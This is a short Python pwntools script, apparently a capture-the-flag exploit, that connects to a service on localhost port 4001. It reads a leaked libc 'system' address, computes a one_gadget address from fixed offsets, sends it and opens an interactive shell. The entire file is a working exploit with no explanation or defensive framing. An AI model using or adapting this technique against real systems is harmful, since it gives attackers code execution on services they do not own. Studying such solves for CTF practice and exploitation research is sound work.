#!/usr/bin/python
from pwn import *

host = 'localhost'
port = 4001

r = remote(host, port)
r.recvuntil(':')
r.sendline('yes')
r.recvuntil('the mage hands you ')
system = int(r.recvuntil(']')[:-1], 16)
one_gadget = system + 0x45216 - 0x45390
r.sendline(p64(one_gadget))
r.interactive()
